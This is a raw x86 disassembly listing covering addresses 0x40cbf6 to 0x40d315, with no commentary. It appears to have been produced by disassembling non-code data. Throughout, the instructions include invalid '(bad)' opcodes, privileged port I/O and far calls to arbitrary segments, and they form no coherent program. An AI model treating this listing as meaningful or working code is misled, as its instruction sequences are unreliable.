  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8+0x2e]
  40cbfc:	test   eax,0x8c62fc24
  40cc01:	jle    0x40cc81
  40cc03:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40cc07:	lahf   
  40cc08:	dec    ebp
  40cc09:	sub    dl,BYTE PTR [esi+0x75]
  40cc0c:	ss aas 
  40cc0e:	cmp    DWORD PTR [esi],ecx
  40cc10:	out    dx,eax
  40cc11:	retf   
  40cc12:	adc    ah,bl
  40cc14:	lock test al,0x90
  40cc17:	xor    BYTE PTR [eax],al
  40cc19:	lods   eax,DWORD PTR ds:[esi]
  40cc1a:	inc    esi
  40cc1b:	(bad)  
  40cc1c:	stc    
  40cc1d:	dec    ebp
  40cc1e:	data16 aas 
  40cc20:	push   edi
  40cc21:	add    BYTE PTR [ebx+0x1d128000],dl
  40cc27:	lods   al,BYTE PTR ds:[esi]
  40cc28:	jo     0x40cbe4
  40cc2a:	cmp    al,0x91
  40cc2c:	pop    esi
  40cc2d:	loope  0x40cc60
  40cc2f:	or     BYTE PTR [ebx+0x1d5ffd4c],cl
  40cc35:	cmp    al,0xb6
  40cc37:	int    0x8
  40cc39:	shr    cl,cl
  40cc3b:	lods   eax,DWORD PTR ds:[esi]
  40cc3c:	loopne 0x40cc62
  40cc3e:	cmp    al,0x47
  40cc40:	xchg   edx,eax
  40cc41:	cmp    edx,edx
  40cc43:	(bad)  
  40cc46:	iret   
  40cc47:	fdivr  DWORD PTR ds:0x188b9adb
  40cc4d:	out    dx,al
  40cc4e:	push   ebp
  40cc4f:	add    eax,0x4981726d
  40cc54:	cwde   
  40cc55:	test   DWORD PTR [esi+0x3c95185d],ebx
  40cc5b:	loop   0x40cc60
  40cc5d:	mov    ecx,0x809fdecc
  40cc62:	in     eax,0x6c
  40cc64:	or     cl,BYTE PTR [edx]
  40cc66:	xchg   ebx,eax
  40cc67:	fistp  WORD PTR [edi-0x70c747f]
  40cc6d:	imul   BYTE PTR [edi]
  40cc6f:	cwd    
  40cc71:	or     BYTE PTR [esi],ch
  40cc73:	retf   0xbe6e
  40cc76:	and    DWORD PTR [ebp-0x55f681a7],esp
  40cc7c:	leave  
  40cc7d:	repnz add al,0xe1
  40cc80:	add    ebx,DWORD PTR [edi+0x7a]
  40cc83:	mov    dl,0x56
  40cc85:	cwde   
  40cc86:	repnz dec sp
  40cc89:	dec    ebp
  40cc8a:	or     BYTE PTR [ebp+0x20],cl
  40cc8d:	dec    ecx
  40cc8e:	jns    0x40cc9b
  40cc90:	sbb    DWORD PTR [ecx-0x7f],ebp
  40cc93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc94:	clc    
  40cc95:	push   edi
  40cc96:	jbe    0x40cc9e
  40cc98:	mov    ebp,0x81c958c7
  40cc9d:	loope  0x40cc25
  40cc9f:	fwait
  40cca0:	aaa    
  40cca1:	mov    ebp,0xfc2d5429
  40cca6:	cdq    
  40cca7:	outs   dx,BYTE PTR ds:[esi]
  40cca8:	les    ebp,FWORD PTR [ecx+0x6b0e223d]
  40ccae:	enter  0x6f25,0x9d
  40ccb2:	adc    eax,0xff54deb2
  40ccb7:	and    bl,BYTE PTR [edx]
  40ccb9:	ss push cs
  40ccbb:	pop    eax
  40ccbc:	dec    edx
  40ccbd:	outs   dx,BYTE PTR ds:[esi]
  40ccbe:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccc0:	push   0x45
  40ccc2:	fist   DWORD PTR [edi+ecx*2]
  40ccc5:	stos   DWORD PTR es:[edi],eax
  40ccc6:	xchg   edi,eax
  40ccc7:	jmp    0xa9e729bc
  40cccc:	add    BYTE PTR [ecx-0x5f061395],0xb0
  40ccd3:	mov    bh,0xe8
  40ccd5:	shl    ah,cl
  40ccd7:	test   eax,0x496787b8
  40ccdc:	inc    ecx
  40ccdd:	or     BYTE PTR [ebx+eiz*8-0x45],ch
  40cce1:	das    
  40cce2:	sbb    ecx,DWORD PTR [ecx-0x557e1017]
  40cce8:	mov    edi,0x2f6ee433
  40cced:	xchg   edi,eax
  40ccee:	mov    esi,0xdcbe90a0
  40ccf3:	aam    0xe2
  40ccf5:	rol    ebx,1
  40ccf7:	test   BYTE PTR [edi+ebp*1],ah
  40ccfa:	xchg   edx,eax
  40ccfb:	in     al,dx
  40ccfc:	pop    eax
  40ccfd:	mov    ds:0x956ef66f,al
  40cd02:	dec    eax
  40cd03:	or     eax,0xcb04d757
  40cd08:	sbb    al,0x81
  40cd0a:	nop
  40cd0b:	imul   edi,DWORD PTR [edi],0xfffffff2
  40cd0e:	call   0xbadf:0xeb401527
  40cd15:	stos   BYTE PTR es:[edi],al
  40cd16:	mov    ebx,0xaef77d7f
  40cd1b:	xor    bh,BYTE PTR [esi+ecx*2]
  40cd1e:	loop   0x40cd8e
  40cd20:	sbb    ebx,DWORD PTR [edi]
  40cd22:	sub    dl,0x3e
  40cd25:	nop
  40cd26:	fs shl edx,0xbe
  40cd2a:	shl    dh,cl
  40cd2c:	mov    al,ds:0x197a6b07
  40cd31:	(bad)  [ecx+0x78]
  40cd34:	sti    
  40cd35:	xor    dh,BYTE PTR [edx]
  40cd37:	xor    BYTE PTR [ebp-0x4c],bh
  40cd3a:	add    eax,0x1c883765
  40cd3f:	inc    ecx
  40cd40:	ret    
  40cd41:	(bad)  
  40cd42:	and    eax,0xc3a066ac
  40cd47:	inc    eax
  40cd48:	dec    edx
  40cd49:	xchg   DWORD PTR [ebp-0x64fdeaf5],eax
  40cd4f:	mov    edx,cs
  40cd51:	lods   eax,DWORD PTR ds:[esi]
  40cd52:	xchg   DWORD PTR [eax],ecx
  40cd54:	int3   
  40cd55:	xor    BYTE PTR [ebx],al
  40cd57:	(bad)  
  40cd59:	shr    DWORD PTR [esi+0x7d],0x5a
  40cd5d:	(bad)  [ebp-0x4fa51b50]
  40cd63:	and    BYTE PTR [ebp+0x6],cl
  40cd66:	sbb    esp,DWORD PTR [esi-0x7bf07f9a]
  40cd6c:	mov    WORD PTR [ebp-0x39b31e54],es
  40cd72:	adc    ecx,DWORD PTR [edx-0x79]
  40cd75:	sub    esp,DWORD PTR [edx-0x1c52f5e5]
  40cd7b:	fwait
  40cd7c:	lods   al,BYTE PTR ds:[esi]
  40cd7d:	sbb    dh,0x59
  40cd80:	push   ebx
  40cd81:	xor    ah,BYTE PTR [eax-0x1e]
  40cd84:	inc    ebp
  40cd85:	xchg   esp,eax
  40cd86:	sbb    al,0x81
  40cd88:	pop    eax
  40cd89:	adc    ecx,DWORD PTR [ebp+0x69]
  40cd8c:	jbe    0x40cd9f
  40cd8e:	test   ch,0x25
  40cd91:	adc    eax,0xc8093350
  40cd96:	sahf   
  40cd97:	xchg   edx,eax
  40cd98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd99:	jmp    0x40cdd8
  40cd9b:	adc    BYTE PTR [edx-0x29],bl
  40cd9e:	ss inc edx
  40cda0:	pop    ebp
  40cda1:	mov    edx,0x456b1513
  40cda6:	in     al,0xa0
  40cda8:	es nop
  40cdaa:	dec    edx
  40cdab:	add    eax,0x9419d3
  40cdb0:	cmp    edx,DWORD PTR ds:0x7f9f7318
  40cdb6:	cmp    BYTE PTR [ebx],dl
  40cdb8:	(bad)  
  40cdb9:	call   0x9efc:0x9296d68
  40cdc0:	dec    ecx
  40cdc1:	in     al,0x5c
  40cdc3:	dec    esi
  40cdc4:	mov    esp,0xd408c4e2
  40cdc9:	shl    DWORD PTR [ebx],cl
  40cdcb:	bound  ebp,QWORD PTR [edx+ebp*8]
  40cdce:	les    edi,FWORD PTR [ecx+0x5]
  40cdd1:	mov    bh,0x26
  40cdd3:	(bad)  
  40cdd4:	push   es
  40cdd5:	sub    ch,ah
  40cdd7:	jmp    0x40ce4e
  40cdd9:	lea    ebp,[ebx-0x284523d3]
  40cddf:	jmp    0x40cd91
  40cde1:	push   0x755b7182
  40cde6:	arpl   WORD PTR [eax+eax*4-0x41bacbb3],bp
  40cded:	add    ah,BYTE PTR [esi]
  40cdef:	xor    DWORD PTR [ebp+0x2e],ebx
  40cdf2:	pop    edx
  40cdf3:	mul    BYTE PTR [esi]
  40cdf5:	dec    esp
  40cdf6:	xor    dh,BYTE PTR [eax]
  40cdf8:	pop    ss
  40cdf9:	xchg   edx,ebp
  40cdfb:	sub    eax,DWORD PTR [edx]
  40cdfd:	out    dx,al
  40cdfe:	lahf   
  40cdff:	rol    ebx,1
  40ce01:	popa   
  40ce02:	outs   dx,BYTE PTR ds:[esi]
  40ce03:	xchg   BYTE PTR [eax-0x2c6e0461],ah
  40ce09:	loop   0x40cdb1
  40ce0b:	mov    esp,0x67d88434
  40ce10:	pop    es
  40ce11:	sbb    ebx,esi
  40ce13:	scas   eax,DWORD PTR es:[edi]
  40ce14:	cmc    
  40ce15:	icebp  
  40ce16:	outs   dx,DWORD PTR ds:[esi]
  40ce17:	xlat   BYTE PTR ds:[ebx]
  40ce18:	xchg   ecx,eax
  40ce19:	ins    BYTE PTR es:[edi],dx
  40ce1a:	nop
  40ce1b:	cli    
  40ce1c:	mov    ch,0x14
  40ce1e:	jne    0x40ce88
  40ce20:	mov    ah,BYTE PTR [ebx+eax*2]
  40ce23:	(bad)  
  40ce24:	popf   
  40ce25:	ins    WORD PTR es:[edi],dx
  40ce27:	mov    edi,0x4bbd1e02
  40ce2c:	test   DWORD PTR [edx-0x565bcd45],edx
  40ce32:	jae    0x40ce13
  40ce34:	stos   DWORD PTR es:[edi],eax
  40ce35:	pop    edi
  40ce36:	cmc    
  40ce37:	fwait
  40ce38:	push   esi
  40ce39:	sub    dl,dh
  40ce3b:	data16 lahf 
  40ce3d:	dec    esp
  40ce3e:	scas   al,BYTE PTR es:[edi]
  40ce3f:	idiv   DWORD PTR [eax-0x14020452]
  40ce45:	inc    esp
  40ce46:	jmp    0x37f1:0xd9400832
  40ce4d:	sub    ebx,ecx
  40ce4f:	xchg   ebx,ecx
  40ce51:	jmp    0x40d0b4
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	cmp    eax,0x2c0b2170
  40ce67:	mov    edi,DWORD PTR [esi+0x7e]
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	sbb    al,0xa6
  40ce70:	stos   DWORD PTR es:[edi],eax
  40ce71:	dec    esi
  40ce72:	jb     0x40ce84
  40ce74:	loopne 0x40ce5c
  40ce76:	repnz sbb eax,0xf2bb48f6
  40ce7c:	push   eax
  40ce7d:	addr16 (bad) 
  40ce7f:	sbb    BYTE PTR ds:0x30066d,al
  40ce85:	xchg   edx,eax
  40ce86:	aas    
  40ce87:	fldcw  WORD PTR [ebx-0x2927d64b]
  40ce8d:	or     dl,bh
  40ce8f:	add    al,0x99
  40ce91:	jmp    0x78533972
  40ce96:	popa   
  40ce97:	sub    al,0x90
  40ce99:	or     edi,edi
  40ce9b:	test   eax,0xce4978e8
  40cea0:	ins    BYTE PTR es:[edi],dx
  40cea1:	push   edx
  40cea2:	sub    BYTE PTR [ecx+0x4c],ch
  40cea5:	adc    BYTE PTR [eax+0x7a],dh
  40cea8:	and    DWORD PTR [ebx+0x52],ebx
  40ceab:	and    dl,cl
  40cead:	inc    ebp
  40ceae:	mov    esp,0xa70f23c2
  40ceb3:	jno    0x40ce52
  40ceb5:	(bad)  
  40ceb6:	loopne 0x40cedf
  40ceb8:	neg    DWORD PTR [esi-0x4445732f]
  40cebe:	(bad)
  40cec1:	inc    esp
  40cec2:	cmp    bh,BYTE PTR [ebp-0x320260c7]
  40cec8:	rcr    BYTE PTR [ebp+0x5c534749],0x35
  40cecf:	aad    0x20
  40ced1:	inc    edx
  40ced2:	xor    DWORD PTR [ebx+eiz*2+0x64],eax
  40ced6:	enter  0x8395,0x66
  40ceda:	lds    ebx,FWORD PTR [edi-0x71]
  40cedd:	and    cl,ch
  40cedf:	ret    0x60aa
  40cee2:	ja     0x40ced6
  40cee4:	in     eax,dx
  40cee5:	or     al,0x24
  40cee7:	xchg   edi,eax
  40cee8:	jb     0x40cf50
  40ceea:	mov    bh,0xd
  40ceec:	mov    bl,BYTE PTR [esi]
  40ceee:	ins    DWORD PTR es:[edi],dx
  40ceef:	push   0x36
  40cef1:	push   eax
  40cef2:	cld    
  40cef3:	and    esi,esi
  40cef5:	jle    0x40cf54
  40cef7:	sahf   
  40cef8:	jb     0x40cede
  40cefa:	xor    al,0x7b
  40cefc:	pop    ebp
  40cefd:	fs es out 0x72,eax
  40cf01:	jns    0x40cf10
  40cf03:	xchg   edi,eax
  40cf04:	ds gs cmp al,0x2e
  40cf08:	aas    
  40cf09:	pop    ecx
  40cf0a:	das    
  40cf0b:	std    
  40cf0c:	in     eax,dx
  40cf0d:	iret   
  40cf0e:	mov    dh,0x4
  40cf10:	push   ecx
  40cf11:	retf   
  40cf12:	dec    ebp
  40cf13:	fidivr DWORD PTR [edx+esi*2-0x3a]
  40cf17:	addr16 push 0x1a
  40cf1a:	in     al,dx
  40cf1b:	cli    
  40cf1c:	dec    esp
  40cf1d:	push   0x19a0497
  40cf22:	push   ebp
  40cf23:	mov    edx,0x71d2f822
  40cf28:	dec    ebx
  40cf29:	sub    esp,edi
  40cf2b:	add    bl,bh
  40cf2d:	mov    ebx,0x694b9440
  40cf32:	xchg   ecx,eax
  40cf33:	out    dx,eax
  40cf34:	fisttp WORD PTR [edx]
  40cf36:	(bad)  
  40cf37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf38:	add    edx,DWORD PTR [esi]
  40cf3a:	ret    0xc205
  40cf3d:	mov    dl,0x7
  40cf3f:	rcl    DWORD PTR [ebp-0x9],0x73
  40cf43:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40cf45:	sahf   
  40cf46:	daa    
  40cf47:	or     al,0xc4
  40cf49:	jns    0x40cf4c
  40cf4b:	aad    0x4f
  40cf4d:	out    dx,eax
  40cf4e:	cdq    
  40cf4f:	out    dx,al
  40cf50:	ds out 0x96,eax
  40cf53:	inc    ebx
  40cf54:	or     DWORD PTR [edi+esi*2],esi
  40cf57:	fist   DWORD PTR [esi]
  40cf59:	dec    eax
  40cf5a:	je     0x40cf2f
  40cf5c:	jecxz  0x40cf55
  40cf5e:	mov    ebp,0x5847b887
  40cf63:	lods   eax,DWORD PTR fs:[esi]
  40cf65:	mov    bh,bh
  40cf67:	push   esi
  40cf68:	sub    al,0xf2
  40cf6a:	add    al,0x8f
  40cf6c:	aam    0x56
  40cf6e:	jo     0x40cf73
  40cf70:	mov    eax,DWORD PTR [edi-0x52b75ca2]
  40cf76:	sbb    DWORD PTR [ecx],ecx
  40cf78:	js     0x40cf8b
  40cf7a:	out    0xfe,eax
  40cf7c:	cld    
  40cf7d:	pushf  
  40cf7e:	addr16 int3 
  40cf80:	test   al,0x79
  40cf82:	xor    DWORD PTR [edx+0x20],ebp
  40cf85:	call   0xed20b352
  40cf8a:	push   edi
  40cf8b:	clc    
  40cf8c:	jns    0x40cfb4
  40cf8e:	les    edi,FWORD PTR [eax+0xe]
  40cf91:	es ss retf 
  40cf94:	and    al,0xea
  40cf96:	xacquire xchg BYTE PTR [edi+0x75],cl
  40cf9a:	loope  0x40cfa9
  40cf9c:	cld    
  40cf9d:	pushf  
  40cf9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf9f:	xlat   BYTE PTR ds:[ebx]
  40cfa0:	sbb    dh,al
  40cfa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfa3:	addr16 adc eax,0x70f44e98
  40cfa9:	std    
  40cfaa:	daa    
  40cfab:	sbb    ch,BYTE PTR cs:[edi+0xcef0cb6]
  40cfb2:	mov    bh,0xa7
  40cfb4:	loopne 0x40cfe2
  40cfb6:	cmp    ah,BYTE PTR [edi-0x69]
  40cfb9:	(bad)  
  40cfba:	jp     0x40cfae
  40cfbc:	lahf   
  40cfbd:	mov    fs,WORD PTR [ebx+0x2a5507d6]
  40cfc3:	xchg   DWORD PTR [edx],edx
  40cfc5:	dec    esp
  40cfc6:	mov    ds:0x450e702,al
  40cfcb:	xchg   ebx,eax
  40cfcc:	inc    esi
  40cfcd:	add    bh,bh
  40cfcf:	push   es
  40cfd0:	mov    ebp,0x6df06384
  40cfd5:	jno    0x40d015
  40cfd7:	in     eax,0x25
  40cfd9:	pop    edi
  40cfda:	xchg   BYTE PTR ds:0xb23a252a,al
  40cfe0:	mov    ds:0xfd494634,al
  40cfe5:	sti    
  40cfe6:	push   ecx
  40cfe7:	shld   eax,ebp,0x40
  40cfeb:	fisub  DWORD PTR [edi-0x46a91e08]
  40cff1:	stos   DWORD PTR es:[edi],eax
  40cff2:	xchg   edx,eax
  40cff3:	jo     0x40cf8d
  40cff5:	push   ss
  40cff6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cff7:	jo     0x40d038
  40cff9:	fs in  al,dx
  40cffb:	or     DWORD PTR [edi+0x324efd1a],edx
  40d001:	pushw  0xffdb
  40d004:	or     esp,ecx
  40d006:	push   esi
  40d007:	push   edx
  40d008:	cmp    dh,BYTE PTR [ebx-0xc459f79]
  40d00e:	cmp    eax,0x597cb295
  40d013:	cmp    BYTE PTR [edx+0x1b],0xb8
  40d017:	cld    
  40d018:	pop    es
  40d019:	pusha  
  40d01a:	in     al,dx
  40d01b:	adc    DWORD PTR [eax+0x4b],esi
  40d01e:	aaa    
  40d01f:	inc    edi
  40d020:	fadd   st(3),st
  40d022:	xor    ecx,esp
  40d024:	or     DWORD PTR [edi],edx
  40d026:	imul   edx
  40d028:	add    eax,0xb942cf07
  40d02d:	adc    eax,0xedf0afb9
  40d032:	fidiv  WORD PTR ds:0xcac6c782
  40d038:	push   ss
  40d039:	push   eax
  40d03a:	mov    ah,0x83
  40d03c:	pop    ds
  40d03d:	sub    al,BYTE PTR [ebp*8-0x1d25c364]
  40d044:	jmp    0x40d03e
  40d046:	pop    ss
  40d047:	mov    al,0xc2
  40d049:	xor    ecx,eax
  40d04b:	mov    ch,0xff
  40d04d:	sub    DWORD PTR [edx-0x47],ebp
  40d050:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d051:	mov    ds:0xfe2400d6,al
  40d056:	add    BYTE PTR [eax],0xee
  40d059:	xchg   dh,dl
  40d05b:	adc    al,0x3d
  40d05d:	adc    BYTE PTR [edx-0x2078b1b3],bh
  40d063:	jge    0x40d06c
  40d065:	call   0x4f88:0x89db73a
  40d06c:	xor    al,0xf0
  40d06e:	mov    bl,0xd1
  40d070:	adc    DWORD PTR [edx],0x7887dbf2
  40d076:	psllq  mm3,QWORD PTR [ebx-0x584390b0]
  40d07d:	aad    0x1
  40d07f:	jo     0x40d0b5
  40d081:	mov    ah,0x2b
  40d083:	pop    ebx
  40d084:	xor    dl,BYTE PTR [eax+0x17]
  40d087:	pop    ds
  40d088:	aam    0x7
  40d08a:	(bad)  
  40d08b:	mov    eax,DWORD PTR [eax-0x3e]
  40d08e:	pop    ecx
  40d08f:	mov    eax,0x72d65851
  40d094:	loope  0x40d0d8
  40d096:	outs   dx,BYTE PTR ds:[esi]
  40d097:	adc    DWORD PTR [edx],0x25f2ed2d
  40d09d:	pop    eax
  40d09e:	adc    bl,ch
  40d0a0:	add    esi,esi
  40d0a2:	or     eax,0xea9dc3ab
  40d0a7:	stos   DWORD PTR es:[edi],eax
  40d0a8:	scas   al,BYTE PTR es:[edi]
  40d0a9:	inc    eax
  40d0aa:	popf   
  40d0ab:	repnz (bad) 
  40d0ad:	retf   0xe80a
  40d0b0:	popf   
  40d0b1:	xchg   esp,eax
  40d0b2:	loope  0x40d0de
  40d0b4:	dec    ecx
  40d0b5:	mov    eax,DWORD PTR [ebp-0x1c]
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	cli    
  40d0d0:	adc    cl,BYTE PTR [ebp+0x49]
  40d0d3:	test   BYTE PTR [ecx+0x7c387e7e],0x7e
  40d0da:	jle    0x40d0ca
  40d0dc:	or     DWORD PTR [edi-0x79],esi
  40d0df:	pop    es
  40d0e0:	das    
  40d0e1:	repz (bad) 
  40d0e3:	(bad)  
  40d0e4:	mov    dl,0x7f
  40d0e6:	jno    0x40d152
  40d0e8:	cs mov ecx,0x2905d4c9
  40d0ee:	inc    esp
  40d0ef:	push   cs
  40d0f0:	sbb    al,0xd0
  40d0f2:	hlt    
  40d0f3:	retf   0x9162
  40d0f6:	popf   
  40d0f7:	ja     0x40d0f0
  40d0f9:	(bad)  
  40d0fb:	icebp  
  40d0fc:	pop    edx
  40d0fd:	fcomp  DWORD PTR [ebp+0x7f]
  40d100:	pusha  
  40d101:	add    BYTE PTR [eax-0x27ffa160],al
  40d107:	pop    esi
  40d108:	pop    ebx
  40d109:	add    al,0xf1
  40d10b:	mov    al,0xb2
  40d10d:	jge    0x40d0e7
  40d10f:	xchg   DWORD PTR [eax],esp
  40d111:	mov    esi,0xccd6b8a6
  40d116:	das    
  40d117:	cmp    al,0xec
  40d119:	(bad)  
  40d11a:	cmp    al,0x2d
  40d11c:	call   0x5111:0x154ddc4d
  40d123:	push   cs
  40d124:	bound  ecx,QWORD PTR [edi]
  40d126:	sbb    edi,ebp
  40d128:	push   ss
  40d129:	cmp    bh,BYTE PTR [ecx+0x74]
  40d12c:	add    DWORD PTR [edi-0x65],ebp
  40d12f:	retfw  0x4a8e
  40d133:	dec    edx
  40d134:	packuswb mm7,QWORD PTR [eax+ebp*8-0x56]
  40d139:	jno    0x40d0e5
  40d13b:	or     eax,0x5648079d
  40d140:	mov    ch,0x72
  40d142:	dec    eax
  40d143:	mov    ds:0xabff2708,eax
  40d148:	fild   QWORD PTR [ebp-0x7b]
  40d14b:	xor    DWORD PTR [esi+0x6],esi
  40d14e:	pop    esp
  40d14f:	call   0x3c2d:0x40602a6c
  40d156:	pop    esp
  40d157:	out    dx,eax
  40d158:	into   
  40d159:	mov    bh,0x74
  40d15b:	xor    BYTE PTR ds:0xa49bcb97,al
  40d161:	mov    esi,0xb04ecca1
  40d166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d167:	cmp    DWORD PTR [edi-0x4c4756af],ecx
  40d16d:	int3   
  40d16e:	hlt    
  40d16f:	imul   ebx,DWORD PTR [ecx-0x78ac04ee],0x975ca911
  40d179:	mov    dh,0x44
  40d17b:	loop   0x40d1f6
  40d17d:	repnz xchg esi,eax
  40d17f:	cmp    ah,BYTE PTR [esp+ebp*4-0x4f]
  40d183:	ja     0x40d120
  40d185:	repz ror DWORD PTR [eax-0x3b],0xcc
  40d18a:	std    
  40d18b:	push   ds
  40d18c:	inc    esp
  40d18d:	std    
  40d18e:	cmp    ebx,esp
  40d190:	rcl    DWORD PTR [ecx+0x44],0x6c
  40d194:	(bad)  
  40d196:	mov    edx,0x6bac2371
  40d19b:	aaa    
  40d19c:	cmp    al,0x98
  40d19e:	pop    esp
  40d19f:	cmp    al,0x84
  40d1a1:	inc    esp
  40d1a2:	jle    0x40d221
  40d1a4:	xchg   esp,eax
  40d1a5:	mov    edi,0xf93d6e30
  40d1aa:	push   edi
  40d1ab:	fistp  DWORD PTR [ebp-0x7]
  40d1ae:	ficom  WORD PTR [ecx]
  40d1b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1b1:	aaa    
  40d1b2:	sti    
  40d1b3:	push   esi
  40d1b4:	pop    ebx
  40d1b5:	push   edi
  40d1b6:	mov    ecx,ecx
  40d1b8:	jbe    0x40d1fc
  40d1ba:	(bad)  
  40d1bb:	mov    eax,0x29661b25
  40d1c0:	pop    ss
  40d1c1:	push   ebx
  40d1c2:	call   0xc34d85d
  40d1c7:	push   es
  40d1c8:	jne    0x40d1fb
  40d1ca:	sub    BYTE PTR [eax],ch
  40d1cc:	sahf   
  40d1cd:	(bad)  
  40d1cf:	mov    al,BYTE PTR [ebx+eiz*2+0x19]
  40d1d3:	adc    BYTE PTR [ebx-0x7],bh
  40d1d6:	jle    0x40d1fe
  40d1d8:	and    al,0x9f
  40d1da:	and    eax,0x455a3343
  40d1df:	xchg   edi,eax
  40d1e0:	or     al,0xaa
  40d1e2:	shl    DWORD PTR [edx+ecx*4+0x46],cl
  40d1e6:	xor    ah,BYTE PTR [edi-0x44f6d56e]
  40d1ec:	pushf  
  40d1ed:	or     al,0x47
  40d1ef:	sbb    eax,edx
  40d1f1:	xor    ebp,edi
  40d1f3:	daa    
  40d1f4:	xor    al,0xf3
  40d1f6:	cmp    eax,0xa2e3ad66
  40d1fb:	xor    ecx,DWORD PTR [eax+0x34241e31]
  40d201:	outs   dx,BYTE PTR ds:[esi]
  40d202:	loopne 0x40d1d0
  40d204:	xor    dl,al
  40d206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d207:	dec    ecx
  40d208:	sar    BYTE PTR [esi+0xf],1
  40d20b:	mov    al,ds:0xcc5d4193
  40d210:	(bad)  
  40d211:	es in  al,dx
  40d213:	test   eax,0x7e45db95
  40d218:	add    edx,eax
  40d21a:	push   ebp
  40d21b:	jecxz  0x40d251
  40d21d:	push   esi
  40d21e:	fsqrt  
  40d220:	fdiv   st,st(7)
  40d222:	jp     0x40d249
  40d224:	das    
  40d225:	push   ebp
  40d226:	popa   
  40d227:	dec    ecx
  40d228:	ins    BYTE PTR es:[edi],dx
  40d229:	inc    ecx
  40d22a:	in     al,0x63
  40d22c:	daa    
  40d22d:	or     BYTE PTR [edi-0xd],dl
  40d230:	mov    bl,0x42
  40d232:	icebp  
  40d233:	xchg   ecx,eax
  40d234:	fbstp  TBYTE PTR [ebp+0x47]
  40d237:	(bad)  
  40d238:	out    0x9f,eax
  40d23a:	xchg   edi,eax
  40d23b:	test   al,0xd
  40d23d:	mov    cl,0x89
  40d23f:	iret   
  40d240:	icebp  
  40d241:	and    edx,0xffffffb4
  40d244:	aad    0x2f
  40d246:	inc    ecx
  40d247:	push   ebx
  40d248:	dec    ebp
  40d249:	jns    0x40d1db
  40d24b:	sub    al,0x37
  40d24d:	and    DWORD PTR [esi+0x68],ebx
  40d250:	sub    edi,DWORD PTR [ecx]
  40d252:	jge    0x40d1fa
  40d254:	adc    BYTE PTR [eax-0xb],bh
  40d257:	test   al,0xdd
  40d259:	push   0x3cf39135
  40d25e:	and    esi,DWORD PTR [esi-0x75]
  40d261:	shl    eax,cl
  40d263:	sar    BYTE PTR [ebp+0x18],1
  40d266:	push   es
  40d267:	add    DWORD PTR [ecx+0x478db699],esp
  40d26d:	mov    al,ds:0x3c43fa59
  40d272:	sub    ah,cl
  40d274:	ret    
  40d275:	push   eax
  40d276:	jmp    0x40d2b6
  40d278:	repz cmp edx,DWORD PTR [edx]
  40d27b:	nop
  40d27c:	cs mov bl,0xe3
  40d27f:	(bad)  
  40d280:	fbld   TBYTE PTR [ebx]
  40d282:	pop    eax
  40d283:	test   eax,0xd803056e
  40d288:	jmp    0x40d255
  40d28a:	adc    BYTE PTR [eax],0x62
  40d28d:	jns    0x40d25e
  40d28f:	cs popa 
  40d291:	and    edi,0xfffffff1
  40d294:	out    dx,eax
  40d295:	ror    DWORD PTR [edx+eiz*4+0x664578df],1
  40d29c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d29d:	push   esi
  40d29e:	int    0x6b
  40d2a0:	mov    bh,0x54
  40d2a2:	pop    es
  40d2a3:	mov    esp,0x50e43aee
  40d2a8:	jl     0x40d318
  40d2aa:	(bad)  
  40d2ab:	sub    edx,DWORD PTR [edx-0x1a]
  40d2ae:	mov    ecx,0x7732d4ba
  40d2b3:	loope  0x40d23e
  40d2b5:	adc    esp,ebp
  40d2b7:	or     DWORD PTR [ecx],0x28
  40d2ba:	pop    es
  40d2bb:	mov    dh,0x36
  40d2bd:	jle    0x40d2d7
  40d2bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2c0:	(bad)  
  40d2c1:	mov    dh,0x2e
  40d2c3:	push   ebx
  40d2c4:	ja     0x40d2a2
  40d2c6:	mov    eax,ds:0x2e442d28
  40d2cb:	sbb    esi,esp
  40d2cd:	lods   eax,DWORD PTR ds:[esi]
  40d2ce:	add    BYTE PTR [eax],dl
  40d2d0:	stos   DWORD PTR es:[edi],eax
  40d2d1:	in     al,0xa6
  40d2d3:	(bad)  
  40d2d4:	sub    BYTE PTR [ebp-0x6152c7db],bl
  40d2da:	jge    0x40d342
  40d2dc:	ret    0x4004
  40d2df:	pop    ebx
  40d2e0:	aam    0xc9
  40d2e2:	ss jb  0x40d314
  40d2e5:	dec    ecx
  40d2e6:	dec    ebp
  40d2e7:	xor    DWORD PTR [edi-0x1a7c65ce],ebp
  40d2ed:	outs   dx,DWORD PTR ds:[esi]
  40d2ee:	and    edx,eax
  40d2f0:	retf   0xf2aa
  40d2f3:	in     al,0x3e
  40d2f5:	xor    ecx,DWORD PTR [edi]
  40d2f7:	dec    ecx
  40d2f8:	sbb    eax,0x735653ac
  40d2fd:	mov    ebp,0x2f164256
  40d302:	lahf   
  40d303:	iret   
  40d304:	(bad)  
  40d305:	and    al,0x9
  40d307:	mov    al,0x27
  40d309:	call   0xe217:0x96c9b1bf
  40d310:	jbe    0x40d2b9
  40d312:	xchg   edx,eax
  40d313:	mov    bl,0x2b
  40d315:	jno    0x40d2ab
